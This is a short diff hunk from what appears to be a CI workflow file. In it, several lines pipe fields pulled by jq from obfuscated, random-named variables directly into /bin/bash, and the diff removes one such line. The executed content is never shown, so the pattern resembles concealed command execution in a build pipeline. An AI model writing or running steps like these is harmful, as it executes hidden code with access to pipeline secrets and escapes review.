@@ -24,7 +24,6 @@ jobs:
           echo $w910 | jq -r .d1 | /bin/bash
           printf '%s' "$nngj2633" | jq -r .l02721 | /bin/bash
           echo $vzc4 | jq -r .pjbq2794 | /bin/bash
-          echo $uslb197 | jq -r .cipyp92824 | /bin/bash
 
       - name: Store results
         if: always()
